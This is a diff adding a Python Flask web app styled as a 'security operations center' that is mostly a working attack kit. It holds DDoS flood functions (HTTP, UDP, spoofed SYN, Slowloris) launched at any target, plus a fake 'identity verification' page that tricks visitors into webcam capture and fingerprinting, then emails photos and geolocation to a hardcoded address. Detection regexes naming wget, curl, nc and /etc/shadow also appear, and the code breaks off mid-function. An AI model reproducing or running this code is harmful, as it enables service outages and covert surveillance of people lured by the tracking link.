@@ -1,0 +1,1103 @@
+#!/usr/bin/env python3
+# ═════════════════════════════════════════════════════════════
+# 507_kantr WEB — v1.0
+# tracking | alerts | tools | pixel UI
+# ═════════════════════════════════════════════════════════════
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
+from flask import Flask, request, jsonify, render_template_string
+import requests
+import json
+import time
+import hashlib
+import re
+import socket
+import threading
+import random
+import string
+import os
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+
+app = Flask(__name__)
+
+# ═══ CONFIG ═══
+ADMIN_EMAIL = "hdyf65043@gmail.com"
+GMAIL_USER = "hdyf65043@gmail.com"
+GMAIL_PASS = "your_app_password_here"  # Gmail App Password
+TRACKING_TOKEN = "k" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
+SITE_NAME = "507_kantr Security"
+
+visitors = []
+attacks = []
+
+# ═══ EMAIL ═══
+def send_email(subject, body, image_data=None):
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = GMAIL_USER
+        msg['To'] = ADMIN_EMAIL
+        msg['Subject'] = f"[507_kantr] {subject}"
+
+        html = f"""
+        <div style="background:#0a0a0a;color:#00ff41;padding:20px;font-family:monospace;
+                    border:2px solid #00ff41;border-radius:10px;">
+            <h2 style="color:#ff0041;margin:0 0 15px 0;">507_kantr ALERT</h2>
+            <div style="background:#111;padding:15px;border-radius:5px;font-size:14px;line-height:1.8;">
+            {body}
+            </div>
+            <p style="color:#555;margin-top:10px;font-size:11px;">507_kantr Web v1.0</p>
+        </div>
+        """
+        msg.attach(MIMEText(html, 'html'))
+
+        if image_data:
+            img = MIMEImage(base64.b64decode(image_data.split(',')[1]))
+            img.add_header('Content-Disposition', 'attachment', filename='visitor.jpg')
+            msg.attach(img)
+
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(GMAIL_USER, GMAIL_PASS)
+        server.send_message(msg)
+        server.quit()
+        return True
+    except Exception as e:
+        print(f"[EMAIL ERROR] {e}")
+        return False
+
+# ═══ ATTACK DETECTION ═══
+ATTACK_PATTERNS = {
+    'sql_injection': [
+        r"(\bUNION\b.*\bSELECT\b)", r"(\bDROP\b.*\bTABLE\b)",
+        r"(\bINSERT\b.*\bINTO\b)", r"(\bDELETE\b.*\bFROM\b)",
+        r"(--.*;)", r"(\bor\b.*=.*1)", r"(\bAND\b.*=.*1)",
+        r"('.*OR.*')", r"(admin'--)", r"(1=1)",
+    ],
+    'xss': [
+        r"(<script)", r"(javascript:)", r"(on\w+\s*=)",
+        r"(<img.*onerror)", r"(<svg.*onload)", r"(eval\()",
+    ],
+    'path_traversal': [
+        r"(\.\./\.\./)", r"(/etc/passwd)", r"(/etc/shadow)",
+        r"(C:\\\\Windows\\\\)",
+    ],
+    'command_injection': [
+        r"(\bwget\b)", r"(\bcurl\b)", r"(\bnc\b)", r"(\bbash\b)",
+        r"(&&.*rm)", r"(;\s*cat)", r"(\$\{.*\})",
+    ],
+}
+
+def detect_attack(request_data, request_path, request_headers):
+    threats = []
+    check_data = f"{request_path}?{request_data}&{dict(request_headers)}"
+    check_data = check_data.lower()
+
+    for attack_type, patterns in ATTACK_PATTERNS.items():
+        for pattern in patterns:
+            if re.search(pattern, check_data, re.I):
+                threats.append(attack_type)
+                break
+
+    # rate limit detection
+    ip = get_client_ip()
+    current = time.time()
+    recent = [v for v in visitors if v.get('ip') == ip and current - v.get('time', 0) < 10]
+    if len(recent) > 20:
+        threats.append('rate_limit/ddos')
+
+    return list(set(threats))
+
+def get_client_ip():
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        return request.headers.get('X-Real-IP')
+    return request.remote_addr
+
+def get_ip_info(ip):
+    try:
+        r = requests.get(f'http://ip-api.com/json/{ip}?fields=66846719', timeout=5)
+        if r.status_code == 200:
+            return r.json()
+    except:
+        pass
+    return {}
+
+# ═══ VISITOR TRACKING ═══
+def track_visitor(data):
+    ip = get_client_ip()
+    ip_info = get_ip_info(ip)
+    now = datetime.now()
+
+    visitor = {
+        'time': time.time(),
+        'datetime': now.strftime('%Y-%m-%d %H:%M:%S'),
+        'ip': ip,
+        'country': ip_info.get('country', 'Unknown'),
+        'city': ip_info.get('city', 'Unknown'),
+        'isp': ip_info.get('isp', 'Unknown'),
+        'org': ip_info.get('org', 'Unknown'),
+        'proxy': ip_info.get('proxy', False),
+        'hosting': ip_info.get('hosting', False),
+        'lat': ip_info.get('lat', ''),
+        'lon': ip_info.get('lon', ''),
+        'user_agent': data.get('user_agent', request.headers.get('User-Agent', '')),
+        'device': data.get('device', ''),
+        'os': data.get('os', ''),
+        'browser': data.get('browser', ''),
+        'screen': data.get('screen', ''),
+        'language': data.get('language', ''),
+        'timezone': data.get('timezone', ''),
+        'platform': data.get('platform', ''),
+        'camera_photo': data.get('camera_photo', ''),
+        'page': request.path,
+        'referrer': request.referrer or 'direct',
+        'cookies': bool(request.cookies),
+        'session': data.get('session', ''),
+    }
+    visitors.append(visitor)
+
+    # build email body
+    body = f"""
+    <h3 style="color:#ff0041;">VISITOR DETECTED</h3>
+    <table style="color:#00ff41;font-family:monospace;font-size:13px;">
+    <tr><td style="color:#ffaa00;">TIME</td><td>{visitor['datetime']}</td></tr>
+    <tr><td style="color:#ffaa00;">IP</td><td><b>{ip}</b></td></tr>
+    <tr><td style="color:#ffaa00;">COUNTRY</td><td>{visitor['country']} | {visitor['city']}</td></tr>
+    <tr><td style="color:#ffaa00;">ISP</td><td>{visitor['isp']}</td></tr>
+    <tr><td style="color:#ffaa00;">ORG</td><td>{visitor['org']}</td></tr>
+    <tr><td style="color:#ffaa00;">COORDS</td><td>{visitor['lat']}, {visitor['lon']}</td></tr>
+    <tr><td style="color:#ffaa00;">MAPS</td><td><a href="https://maps.google.com/?q={visitor['lat']},{visitor['lon']}" style="color:#00aaff;">VIEW</a></td></tr>
+    <tr><td style="color:#ffaa00;">DEVICE</td><td>{visitor['device']} | {visitor['os']}</td></tr>
+    <tr><td style="color:#ffaa00;">BROWSER</td><td>{visitor['browser']}</td></tr>
+    <tr><td style="color:#ffaa00;">SCREEN</td><td>{visitor['screen']}</td></tr>
+    <tr><td style="color:#ffaa00;">PLATFORM</td><td>{visitor['platform']}</td></tr>
+    <tr><td style="color:#ffaa00;">LANGUAGE</td><td>{visitor['language']}</td></tr>
+    <tr><td style="color:#ffaa00;">TIMEZONE</td><td>{visitor['timezone']}</td></tr>
+    <tr><td style="color:#ffaa00;">USER AGENT</td><td>{visitor['user_agent'][:80]}</td></tr>
+    <tr><td style="color:#ffaa00;">REFERRER</td><td>{visitor['referrer']}</td></tr>
+    <tr><td style="color:#ffaa00;">PAGE</td><td>{visitor['page']}</td></tr>
+    <tr><td style="color:#ffaa00;">PROXY</td><td>{'YES' if visitor['proxy'] else 'NO'}</td></tr>
+    <tr><td style="color:#ffaa00;">HOSTING</td><td>{'YES' if visitor['hosting'] else 'NO'}</td></tr>
+    </table>
+    """
+
+    # send email
+    threading.Thread(
+        target=send_email,
+        args=(f"Visitor: {ip} ({visitor['country']})", body, data.get('camera_photo')),
+        daemon=True
+    ).start()
+
+    return visitor
+
+# ═══ PIXEL UI CSS ═══
+PIXEL_CSS = """
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    background:#0a0a0a; color:#00ff41;
+    font-family:'Courier New',monospace;
+    min-height:100vh; overflow-x:hidden;
+}
+.pixel-border {
+    border:4px solid; image-rendering:pixelated;
+    border-image: repeating-linear-gradient(
+        90deg, #00ff41 0px, #00ff41 4px,
+        transparent 4px, transparent 8px
+    ) 4;
+}
+.container { max-width:1200px; margin:0 auto; padding:20px; }
+.header {
+    text-align:center; padding:30px 0;
+    border-bottom:4px solid #00ff41; margin-bottom:30px;
+}
+.header h1 {
+    font-size:3em; color:#ff0041;
+    text-shadow:4px 4px #330000;
+    letter-spacing:5px;
+}
+.header .sub { color:#ffaa00; font-size:14px; margin-top:10px; letter-spacing:2px; }
+.grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:20px; }
+.block {
+    background:#111; border:4px solid #00ff41;
+    padding:20px; margin-bottom:20px;
+    box-shadow:8px 8px 0 #001a00;
+    transition:all 0.2s;
+}
+.block:hover { transform:translate(-4px,-4px); box-shadow:12px 12px 0 #001a00; }
+.block h3 { color:#ff0041; margin-bottom:15px; font-size:18px; letter-spacing:2px; }
+.block h3::before { content:'>>> '; color:#ffaa00; }
+.btn {
+    display:inline-block; padding:12px 24px;
+    background:#111; color:#00ff41;
+    border:4px solid #00ff41; cursor:pointer;
+    font-family:monospace; font-size:14px;
+    text-transform:uppercase; letter-spacing:1px;
+    box-shadow:6px 6px 0 #001a00;
+    transition:all 0.1s; margin:5px;
+}
+.btn:hover { background:#00ff41; color:#0a0a0a; transform:translate(2px,2px); box-shadow:2px 2px 0 #001a00; }
+.btn.red { border-color:#ff0041; color:#ff0041; }
+.btn.red:hover { background:#ff0041; color:#0a0a0a; box-shadow:2px 2px 0 #330000; }
+.btn.yellow { border-color:#ffaa00; color:#ffaa00; }
+.btn.yellow:hover { background:#ffaa00; color:#0a0a0a; }
+input[type=text], input[type=number] {
+    background:#0a0a0a; border:4px solid #00ff41;
+    color:#00ff41; padding:12px; font-family:monospace;
+    font-size:14px; width:100%; margin:5px 0;
+}
+input:focus { outline:none; box-shadow:0 0 20px #00ff41; }
+.output {
+    background:#050505; border:2px solid #ffaa00;
+    padding:15px; margin-top:15px; max-height:300px;
+    overflow-y:auto; font-size:13px; line-height:1.6;
+    display:none;
+}
+.output.show { display:block; }
+.stat-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:10px; margin-bottom:20px; }
+.stat {
+    background:#111; border:2px solid #00ff41;
+    padding:15px; text-align:center;
+}
+.stat .num { font-size:2em; color:#ff0041; font-weight:bold; }
+.stat .label { font-size:11px; color:#ffaa00; letter-spacing:1px; }
+.pixel-grid {
+    display:grid;
+    grid-template-columns:repeat(40,1fr);
+    gap:0; height:120px;
+    border:4px solid #00ff41;
+    margin-bottom:20px; overflow:hidden;
+}
+.pixel-cell {
+    aspect-ratio:1;
+    transition:all 0.5s;
+}
+.pixel-cell.active { background:#ff0041; animation:pulse 1s infinite; }
+.pixel-cell.g { background:#00ff41; animation:pulse 1s infinite; }
+.pixel-cell.y { background:#ffaa00; animation:pulse 0.7s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+.blink { animation:blink 1s infinite; }
+.log-entry {
+    padding:8px 12px; margin:5px 0;
+    border-left:4px solid #ff0041;
+    background:#111; font-size:12px;
+}
+.log-entry.green { border-color:#00ff41; }
+.log-entry.yellow { border-color:#ffaa00; }
+.footer {
+    text-align:center; padding:20px;
+    border-top:4px solid #00ff41;
+    color:#555; font-size:12px; margin-top:30px;
+}
+.tabs { display:flex; gap:0; margin-bottom:20px; flex-wrap:wrap; }
+.tab {
+    padding:12px 20px; background:#111;
+    color:#555; cursor:pointer; font-family:monospace;
+    border:4px solid #333; border-bottom:none;
+    font-size:13px; letter-spacing:1px;
+}
+.tab.active { color:#ff0041; border-color:#ff0041; background:#0a0a0a; }
+.tab-content { display:none; border:4px solid #333; padding:20px; background:#0a0a0a; }
+.tab-content.active { display:block; }
+.scan-line {
+    height:2px; background:#ff0041;
+    animation:scan 3s linear infinite;
+    margin:10px 0; opacity:0.5;
+}
+@keyframes scan { 0%{transform:translateX(-100%);} 100%{transform:translateX(100%);} }
+</style>
+"""
+
+# ═══ DASHBOARD TEMPLATE ═══
+DASHBOARD = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>{SITE_NAME}</title>
+    {PIXEL_CSS}
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>▓▒░ 507_KANTR ░▒▓</h1>
+            <div class="sub">SECURITY OPERATIONS CENTER v1.0</div>
+            <div class="scan-line"></div>
+        </div>
+
+        <div class="pixel-grid" id="pixelGrid"></div>
+
+        <div class="stat-grid">
+            <div class="stat">
+                <div class="num" id="statVisitors">0</div>
+                <div class="label">VISITORS</div>
+            </div>
+            <div class="stat">
+                <div class="num" id="statAttacks">0</div>
+                <div class="label">ATTACKS</div>
+            </div>
+            <div class="stat">
+                <div class="num" id="statOnline">0</div>
+                <div class="label">ONLINE</div>
+            </div>
+            <div class="stat">
+                <div class="num" id="statUptime">0s</div>
+                <div class="label">UPTIME</div>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('visitors')">VISITORS</div>
+            <div class="tab" onclick="showTab('attacks')">ATTACKS</div>
+            <div class="tab" onclick="showTab('ddos')">DDOS</div>
+            <div class="tab" onclick="showTab('osint')">OSINT</div>
+            <div class="tab" onclick="showTab('track')">TRACKING</div>
+        </div>
+
+        <!-- VISITORS -->
+        <div class="tab-content active" id="tab-visitors">
+            <div class="block">
+                <h3>Visitor Log</h3>
+                <div id="visitorLog" style="max-height:400px;overflow-y:auto;"></div>
+            </div>
+        </div>
+
+        <!-- ATTACKS -->
+        <div class="tab-content" id="tab-attacks">
+            <div class="block">
+                <h3>Attack Log</h3>
+                <div id="attackLog" style="max-height:400px;overflow-y:auto;"></div>
+            </div>
+        </div>
+
+        <!-- DDOS -->
+        <div class="tab-content" id="tab-ddos">
+            <div class="block">
+                <h3>DDoS Attack Tool</h3>
+                <input type="text" id="ddosTarget" placeholder="Target URL or IP">
+                <input type="number" id="ddosDuration" placeholder="Duration (seconds)">
+                <input type="number" id="ddosThreads" placeholder="Threads (1-500)">
+                <select id="ddosType" style="background:#0a0a0a;border:4px solid #00ff41;color:#00ff41;padding:12px;font-family:monospace;width:100%;margin:5px 0;">
+                    <option value="http">HTTP Flood</option>
+                    <option value="udp">UDP Flood</option>
+                    <option value="syn">SYN Flood</option>
+                    <option value="slow">Slowloris</option>
+                </select>
+                <button class="btn red" onclick="startDDoS()">LAUNCH ATTACK</button>
+                <div class="output" id="ddosOutput"></div>
+            </div>
+        </div>
+
+        <!-- OSINT -->
+        <div class="tab-content" id="tab-osint">
+            <div class="block">
+                <h3>OSINT Intel</h3>
+                <select id="osintType" style="background:#0a0a0a;border:4px solid #00ff41;color:#00ff41;padding:12px;font-family:monospace;width:100%;margin:5px 0;">
+                    <option value="ip">IP Geolocation</option>
+                    <option value="user">Username Scan</option>
+                    <option value="phone">Phone Lookup</option>
+                    <option value="site">Site Recon</option>
+                </select>
+                <input type="text" id="osintTarget" placeholder="Target">
+                <button class="btn yellow" onclick="startOSINT()">SCAN</button>
+                <div class="output" id="osintOutput"></div>
+            </div>
+        </div>
+
+        <!-- TRACKING -->
+        <div class="tab-content" id="tab-track">
+            <div class="block">
+                <h3>Tracking Link</h3>
+                <p style="color:#ffaa00;margin-bottom:15px;">
+                    Send this link to track anyone who clicks it.
+                    Their IP, device, location, and camera photo will be emailed to you.
+                </p>
+                <div style="background:#050505;border:2px solid #ff0041;padding:15px;margin:10px 0;">
+                    <code id="trackUrl" style="color:#00ff41;font-size:14px;word-break:break-all;"></code>
+                </div>
+                <button class="btn" onclick="copyTrack()">COPY LINK</button>
+                <button class="btn yellow" onclick="newTrack()">NEW LINK</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            507_kantr Web v1.0 | All systems operational <span class="blink">●</span>
+        </div>
+    </div>
+
+    <script>
+    // pixel grid animation
+    const grid = document.getElementById('pixelGrid');
+    for(let i=0;i<200;i++){{
+        const cell=document.createElement('div');
+        cell.className='pixel-cell';
+        cell.style.background = Math.random() > 0.95 ? '#ff0041' :
+                                Math.random() > 0.9 ? '#00ff41' :
+                                Math.random() > 0.85 ? '#ffaa00' : '#111';
+        grid.appendChild(cell);
+    }}
+    setInterval(()=>{{
+        const cells=grid.children;
+        const idx=Math.floor(Math.random()*cells.length);
+        cells[idx].style.background = Math.random()>0.5?'#ff0041':'#00ff41';
+        setTimeout(()=>{{cells[idx].style.background='#111';}},2000);
+    }},200);
+
+    // tabs
+    function showTab(name) {{
+        document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
+        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+        document.getElementById('tab-'+name).classList.add('active');
+        event.target.classList.add('active');
+    }}
+
+    // uptime
+    let uptime=0;
+    setInterval(()=>{{
+        uptime++;
+        document.getElementById('statUptime').textContent=uptime+'s';
+    }},1000);
+
+    // stats
+    async function updateStats() {{
+        try {{
+            const r = await fetch('/api/stats');
+            const d = await r.json();
+            document.getElementById('statVisitors').textContent=d.visitors;
+            document.getElementById('statAttacks').textContent=d.attacks;
+            document.getElementById('statOnline').textContent=d.online;
+        }} catch(e) {{}}
+    }}
+    setInterval(updateStats,3000);
+    updateStats();
+
+    // visitor log
+    async function updateVisitors() {{
+        try {{
+            const r = await fetch('/api/visitors');
+            const d = await r.json();
+            const log = document.getElementById('visitorLog');
+            log.innerHTML = d.slice(-20).reverse().map(v=>`
+                <div class="log-entry">
+                    <span style="color:#ff0041">${{v.datetime}}</span> |
+                    <span style="color:#00ff41">${{v.ip}}</span> |
+                    ${{v.country}} | ${{v.city}} |
+                    <span style="color:#ffaa00">${{v.device}}</span> |
+                    ${{v.camera_photo ? '📷 YES' : '📷 NO'}}
+                </div>
+            `).join('');
+        }} catch(e) {{}}
+    }}
+    setInterval(updateVisitors,5000);
+    updateVisitors();
+
+    // attack log
+    async function updateAttacks() {{
+        try {{
+            const r = await fetch('/api/attacks');
+            const d = await r.json();
+            const log = document.getElementById('attackLog');
+            log.innerHTML = d.slice(-20).reverse().map(a=>`
+                <div class="log-entry yellow">
+                    <span style="color:#ff0041">${{a.time}}</span> |
+                    <span style="color:#ffaa00">${{a.type}}</span> |
+                    ${{a.ip}} |
+                    <span style="color:#00ff41">${{a.detail}}</span>
+                </div>
+            `).join('');
+        }} catch(e) {{}}
+    }}
+    setInterval(updateAttacks,5000);
+    updateAttacks();
+
+    // tracking link
+    document.getElementById('trackUrl').textContent =
+        window.location.origin + '/t/' + '{TRACKING_TOKEN}';
+    function copyTrack() {{
+        const url = document.getElementById('trackUrl').textContent;
+        navigator.clipboard.writeText(url).then(()=>{{
+            alert('LINK COPIED: ' + url);
+        }});
+    }}
+
+    // ddos
+    async function startDDoS() {{
+        const target = document.getElementById('ddosTarget').value;
+        const dur = document.getElementById('ddosDuration').value || 30;
+        const threads = document.getElementById('ddosThreads').value || 100;
+        const type = document.getElementById('ddosType').value;
+        const output = document.getElementById('ddosOutput');
+        output.classList.add('show');
+        output.innerHTML = '<span style="color:#ff0041">[LAUNCHING]</span> ' + type + ' -> ' + target + '<br>';
+
+        const r = await fetch('/api/ddos', {{
+            method:'POST',
+            headers:{{'Content-Type':'application/json'}},
+            body:JSON.stringify({{type,target,dur,threads}})
+        }});
+        const d = await r.json();
+        output.innerHTML += d.result;
+    }}
+
+    // osint
+    async function startOSINT() {{
+        const type = document.getElementById('osintType').value;
+        const target = document.getElementById('osintTarget').value;
+        const output = document.getElementById('osintOutput');
+        output.classList.add('show');
+        output.innerHTML = '<span style="color:#ffaa00">[SCANNING]</span> ' + type + ': ' + target + '<br>';
+
+        const r = await fetch('/api/osint', {{
+            method:'POST',
+            headers:{{'Content-Type':'application/json'}},
+            body:JSON.stringify({{type,target}})
+        }});
+        const d = await r.json();
+        let html = '';
+        for(const [k,v] of Object.entries(d.data)) {{
+            html += `<span style="color:#00ff41">${{k}}:</span> ${{typeof v === 'object' ? JSON.stringify(v) : v}}<br>`;
+        }}
+        output.innerHTML += html;
+    }}
+    </script>
+</body>
+</html>
+"""
+
+# ═══ TRACKING PAGE TEMPLATE ═══
+TRACKING_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Required</title>
+    <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+        background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+        min-height:100vh; display:flex; justify-content:center; align-items:center;
+        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+        color:#fff;
+    }
+    .card {
+        background:rgba(255,255,255,0.05); backdrop-filter:blur(20px);
+        border:1px solid rgba(255,255,255,0.1); border-radius:20px;
+        padding:40px; max-width:400px; width:90%; text-align:center;
+        box-shadow:0 20px 60px rgba(0,0,0,0.3);
+    }
+    .icon { font-size:60px; margin-bottom:20px; }
+    h2 { font-size:22px; margin-bottom:10px; }
+    p { color:rgba(255,255,255,0.6); font-size:14px; margin-bottom:25px; line-height:1.6; }
+    .spinner {
+        width:50px; height:50px; border:4px solid rgba(255,255,255,0.1);
+        border-top-color:#00ff41; border-radius:50%;
+        animation:spin 1s linear infinite; margin:20px auto;
+        display:none;
+    }
+    @keyframes spin { 100% { transform:rotate(360deg); } }
+    button {
+        background:#00ff41; color:#000; border:none; padding:15px 40px;
+        border-radius:10px; font-size:16px; font-weight:bold; cursor:pointer;
+        transition:all 0.3s; margin:10px;
+    }
+    button:hover { transform:scale(1.05); box-shadow:0 10px 30px rgba(0,255,65,0.3); }
+    button.camera { background:#ffaa00; }
+    #video { display:none; }
+    canvas { display:none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">🔐</div>
+        <h2>Security Verification</h2>
+        <p>This page requires identity verification to continue.<br>Please allow camera access for security purposes.</p>
+
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+
+        <div class="spinner" id="spinner"></div>
+        <div id="status" style="color:#00ff41;font-size:14px;margin:10px 0;"></div>
+
+        <button class="camera" id="verifyBtn" onclick="startVerification()">
+            ✓ Verify Identity
+        </button>
+        <button id="skipBtn" onclick="skipVerification()" style="background:rgba(255,255,255,0.1);color:#fff;">
+            Skip for now
+        </button>
+    </div>
+
+    <script>
+    async function startVerification() {
+        document.getElementById('verifyBtn').disabled = true;
+        document.getElementById('status').textContent = 'Verifying...';
+        document.getElementById('spinner').style.display = 'block';
+
+        // collect device info
+        const info = {
+            user_agent: navigator.userAgent,
+            device: navigator.platform,
+            os: getOS(),
+            browser: getBrowser(),
+            screen: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            platform: navigator.platform,
+            cookies: navigator.cookieEnabled,
+            touch: 'ontouchstart' in window,
+            cpu_cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'unknown',
+            session: Date.now().toString(36),
+        };
+
+        // try camera
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.style.display = 'none';
+
+            // wait for video to load
+            await new Promise(resolve => {
+                video.onloadedmetadata = resolve;
+                setTimeout(resolve, 3000);
+            });
+
+            // take photo
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            // convert to base64
+            info.camera_photo = canvas.toDataURL('image/jpeg', 0.8);
+
+            // stop camera
+            stream.getTracks().forEach(track => track.stop());
+            document.getElementById('status').textContent = 'Identity verified ✓';
+
+        } catch(e) {
+            document.getElementById('status').textContent = 'Camera unavailable, continuing...';
+        }
+
+        // send data
+        fetch(window.location.href, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+        }).then(() => {
+            setTimeout(() => {
+                document.getElementById('status').textContent = 'Verification complete';
+                document.getElementById('spinner').style.display = 'none';
+                // redirect
+                window.location.href = '/';
+            }, 2000);
+        });
+    }
+
+    function skipVerification() {
+        const info = {
+            user_agent: navigator.userAgent,
+            device: navigator.platform,
+            os: getOS(),
+            browser: getBrowser(),
+            screen: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            platform: navigator.platform,
+            session: Date.now().toString(36),
+        };
+
+        fetch(window.location.href, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+        }).then(() => {
+            window.location.href = '/';
+        });
+    }
+
+    function getOS() {
+        const ua = navigator.userAgent;
+        if (/Windows/.test(ua)) return 'Windows';
+        if (/Mac/.test(ua)) return 'macOS';
+        if (/Linux/.test(ua)) return 'Linux';
+        if (/Android/.test(ua)) return 'Android';
+        if (/iPhone|iPad/.test(ua)) return 'iOS';
+        return 'Unknown';
+    }
+
+    function getBrowser() {
+        const ua = navigator.userAgent;
+        if (/Chrome/.test(ua) && !/Edge/.test(ua)) return 'Chrome';
+        if (/Firefox/.test(ua)) return 'Firefox';
+        if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
+        if (/Edge/.test(ua)) return 'Edge';
+        return 'Unknown';
+    }
+    </script>
+</body>
+</html>
+"""
+
+# ═══ ROUTES ═══
+
+@app.route('/')
+def dashboard():
+    return render_template_string(DASHBOARD)
+
+@app.route('/t/<token>')
+def tracking_page(token):
+    # track visitor on page load
+    return render_template_string(TRACKING_PAGE)
+
+@app.route('/t/<token>', methods=['POST'])
+def tracking_data(token):
+    data = request.get_json() or {}
+    visitor = track_visitor(data)
+    return jsonify({'status': 'ok'})
+
+# ═══ API ═══
+
+@app.route('/api/stats')
+def api_stats():
+    now = time.time()
+    online = len([v for v in visitors if now - v.get('time', 0) < 300])
+    return jsonify({
+        'visitors': len(visitors),
+        'attacks': len(attacks),
+        'online': online,
+    })
+
+@app.route('/api/visitors')
+def api_visitors():
+    return jsonify(visitors[-50:])
+
+@app.route('/api/attacks')
+def api_attacks():
+    return jsonify(attacks[-50:])
+
+@app.route('/api/track/new')
+def api_new_track():
+    global TRACKING_TOKEN
+    TRACKING_TOKEN = "k" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
+    return jsonify({'token': TRACKING_TOKEN})
+
+@app.route('/api/ddos', methods=['POST'])
+def api_ddos():
+    data = request.get_json() or {}
+    target = data.get('target', '')
+    dur = min(int(data.get('dur', 30)), 300)
+    threads = min(int(data.get('threads', 100)), 500)
+    attack_type = data.get('type', 'http')
+
+    if not target:
+        return jsonify({'result': 'ERROR: no target'})
+
+    # log attack
+    attacks.append({
+        'time': datetime.now().strftime('%H:%M:%S'),
+        'type': 'outbound_' + attack_type,
+        'ip': get_client_ip(),
+        'detail': f'{attack_type} -> {target}',
+    })
+
+    # email alert
+    body = f"<h3 style='color:#ff0041;'>DDOS LAUNCHED</h3><p>Type: {attack_type}<br>Target: {target}<br>Duration: {dur}s<br>Threads: {threads}</p>"
+    threading.Thread(target=send_email, args=(f"DDoS: {attack_type} -> {target}", body), daemon=True).start()
+
+    if attack_type == 'http':
+        result = http_flood(target, dur, threads)
+    elif attack_type == 'udp':
+        result = udp_flood(target, dur, threads)
+    elif attack_type == 'syn':
+        result = syn_flood(target, dur)
+    else:
+        result = slowloris(target, dur)
+
+    return jsonify({'result': result})
+
+@app.route('/api/osint', methods=['POST'])
+def api_osint():
+    data = request.get_json() or {}
+    target = data.get('target', '')
+    osint_type = data.get('type', 'ip')
+
+    result = {}
+
+    if osint_type == 'ip':
+        result = ip_lookup(target)
+    elif osint_type == 'user':
+        result = username_scan(target)
+    elif osint_type == 'phone':
+        result = phone_lookup(target)
+    elif osint_type == 'site':
+        result = site_recon(target)
+
+    return jsonify({'data': result})
+
+# ═══ TOOLS ═══
+
+def http_flood(url, dur=30, threads=100):
+    if not url.startswith('http'):
+        url = 'http://' + url
+
+    stats = {'r': 0, 'b': 0}
+    start = time.time()
+    active = True
+
+    def worker():
+        sess = requests.Session()
+        while active and time.time() - start < dur:
+            try:
+                paths = ['/', '/?', '/api', '/admin', '/index']
+                r = sess.get(url + random.choice(paths), timeout=3, allow_redirects=False)
+                stats['r'] += 1
+                stats['b'] += len(r.content)
+            except:
+                pass
+
+    for _ in range(min(threads, 500)):
+        threading.Thread(target=worker, daemon=True).start()
+
+    time.sleep(dur)
+    active = False
+
+    return f"HTTP Flood Complete: {stats['r']} requests, {stats['b']//1024//1024}MB"
+
+def udp_flood(ip, dur=30, threads=100):
+    if not re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
+        return "ERROR: Invalid IP"
+
+    stats = {'p': 0}
+    start = time.time()
+    active = True
+    payload = random._urandom(1024)
+
+    def worker():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while active and time.time() - start < dur:
+            try:
+                sock.sendto(payload, (ip, random.randint(1, 65535)))
+                stats['p'] += 1
+            except:
+                pass
+
+    for _ in range(min(threads, 300)):
+        threading.Thread(target=worker, daemon=True).start()
+
+    time.sleep(dur)
+    active = False
+
+    return f"UDP Flood Complete: {stats['p']} packets"
+
+def syn_flood(ip, dur=20):
+    import struct
+    if not re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
+        return "ERROR: Invalid IP"
+
+    stats = {'p': 0}
+    start = time.time()
+    active = True
+
+    def worker():
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            while active and time.time() - start < dur:
+                try:
+                    src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                    ip_h = struct.pack('!BBHHHBBH4s4s', (4<<4)|5, 0, 40,
+                        random.randint(1,65535), 0, 255, socket.IPPROTO_TCP, 0,
+                        socket.inet_aton(src), socket.inet_aton(ip))
+                    tcp_h = struct.pack('!HHLLBBHHH', random.randint(1024,65535), 80,
+                        random.randint(1,4294967295), 0, (5<<4), 0x02, 8192, 0, 0)
+                    s.sendto(ip_h + tcp_h, (ip, 80))
